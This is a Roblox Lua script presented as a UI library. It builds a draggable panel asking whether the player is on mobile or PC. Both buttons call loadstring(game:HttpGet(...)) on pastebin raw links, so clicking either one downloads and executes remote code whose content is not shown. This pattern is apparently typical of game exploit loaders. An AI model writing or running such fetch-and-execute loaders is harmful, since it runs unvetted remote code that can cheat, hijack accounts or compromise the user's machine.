-- Entire UI Library Script

-- UI_Library Module
local UI_Library = {}

-- Function to create a new button
function UI_Library:createButton(parent, text, position, size, callback)
    local button = Instance.new("TextButton")
    button.Parent = parent
    button.Text = text
    button.Position = position
    button.Size = size
    button.TextSize = 36  -- Larger text size
    button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.BorderSizePixel = 0
    button.Font = Enum.Font.GothamBold  -- Use a bold font for impact

    -- Use UserInputService to handle mobile touch and desktop clicks
    local UserInputService = game:GetService("UserInputService")
    local isTouching = false

    -- Create a function to handle touch or click
    local function onButtonInput(input, gameProcessed)
        if gameProcessed then return end

        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            if not isTouching then
                isTouching = true
                callback()
            end
        end
    end

    -- Connect the input event
    button.InputBegan:Connect(onButtonInput)

    return button
end

-- Function to create a panel (container for other UI elements)
function UI_Library:createPanel(parent, position, size)
    local panel = Instance.new("Frame")
    panel.Parent = parent
    panel.Position = position
    panel.Size = size
    panel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  -- Darker background for contrast
    
    -- Make the panel draggable
    local dragging = false
    local dragInput, mousePos, startPos

    local function onInputBegan(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            startPos = panel.Position
            mousePos = input.Position
            dragInput = input
        end
    end

    local function onInputChanged(input)
        if dragging then
            local delta = input.Position - mousePos
            panel.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end

    local function onInputEnded(input)
        if dragging and input == dragInput then
            dragging = false
        end
    end

    -- Connect touch/mouse input events for dragging
    panel.InputBegan:Connect(onInputBegan)
    panel.InputChanged:Connect(onInputChanged)
    panel.InputEnded:Connect(onInputEnded)

    return panel
end

-- Function to create a label
function UI_Library:createLabel(parent, text, position, size)
    local label = Instance.new("TextLabel")
    label.Parent = parent
    label.Text = text
    label.Position = position
    label.Size = size
    label.TextSize = 36  -- Larger text size
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.BackgroundTransparency = 1  -- Makes the background transparent
    label.Font = Enum.Font.GothamBold  -- Use bold font for a stronger appearance
    
    return label
end

-- Now let's run the script as a LocalScript
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Create the UI screen
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer.PlayerGui

-- Create a large panel to hold the UI components
local panel = UI_Library:createPanel(screenGui, UDim2.new(0.5, -300, 0.5, -200), UDim2.new(0, 600, 0, 400))  -- Bigger panel

-- Create a large label at the top of the panel
local label = UI_Library:createLabel(panel, "Are you mobile or PC?", UDim2.new(0.5, -200, 0, 10), UDim2.new(0, 400, 0, 60))

-- Create the first large button with a callback
local button1 = UI_Library:createButton(panel, "I am Mobile!", UDim2.new(0.5, -200, 0, 100), UDim2.new(0, 400, 0, 60), function()
    loadstring(game:HttpGet('https://pastebin.com/raw/UuB51CA2'))()
    -- Hide the panel after button is pressed
    panel.Visible = false
end)

-- Create the second large button with a callback
local button2 = UI_Library:createButton(panel, "I am PC!", UDim2.new(0.5, -200, 0, 180), UDim2.new(0, 400, 0, 60), function()
    loadstring(game:HttpGet('https://pastebin.com/raw/bLSPwnMD'))()
    -- Hide the panel after button is pressed
    panel.Visible = false
end)
